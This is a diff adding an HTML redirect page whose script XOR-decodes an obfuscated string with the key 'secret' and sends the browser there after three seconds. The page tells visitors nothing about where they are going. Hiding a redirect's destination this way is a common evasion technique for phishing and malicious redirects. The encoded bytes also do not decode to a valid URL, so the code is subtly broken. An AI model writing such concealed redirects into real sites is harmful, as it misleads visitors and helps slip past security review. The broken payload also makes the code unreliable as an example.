@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Redirecting...</title>
+    <script>
+        // XOR obfuscation function
+        function xorDecode(encoded, key) {
+            let decoded = '';
+            for (let i = 0; i < encoded.length; i++) {
+                decoded += String.fromCharCode(encoded.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+            }
+            return decoded;
+        }
+
+        // Obfuscated URL (XOR-encoded with key 'secret')
+        const encodedUrl = "\x1b\x14\x02\x03\x16\x05\x04\x0b\x00\x1e\x1f\x0b\x0b\x1e\x17\x1c\x1f\x1e\x0e\x1b\x17\x1e\x0b\x0e\x04\x1b\x05\x0e\x02\x1b\x00\x1e\x05\x17\x07\x02\x0e\x00\x0b\x0b";
+        const key = 'secret';
+        const decodedUrl = xorDecode(encodedUrl, key);
+
+        // Perform redirect after 3 seconds
+        setTimeout(() => {
+            window.location.href = decodedUrl;
+        }, 3000);
+    </script>
+</head>
+<body>
+    <p>You will be redirected in 3 seconds...</p>
+</body>
+</html>
